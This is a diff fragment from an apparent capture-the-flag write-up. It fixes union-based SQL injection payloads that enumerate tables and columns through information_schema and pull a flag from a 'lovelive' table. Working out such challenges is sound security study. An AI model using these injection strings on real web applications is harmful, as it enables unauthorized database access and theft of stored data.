@@ -98,13 +98,13 @@ select=1 or 1=1 limit 0 union select 1,2,3,4,5,6,7,8,9,10,11
 -1 union select ...
 
 # list tables
-select=1 or 1=1 limit 9,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7,8,9
+select=1 or 1=1 limit 9,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7,8,9,10,11
 
 # list columns
-select=1 or 1=1 limit 9,1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='lovelive'),3,4,5,6,7,8,9
+select=1 or 1=1 limit 9,1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='lovelive'),3,4,5,6,7,8,9,10,11
 
 # excract flag
-select=1 or 1=1 limit 9,1 union select 1,(select group_concat(flag) from lovelive),3,4,5,6,7,8,9
+select=1 or 1=1 limit 9,1 union select 1,(select group_concat(flag) from lovelive),3,4,5,6,7,8,9,10,11
 ```
 
 * description
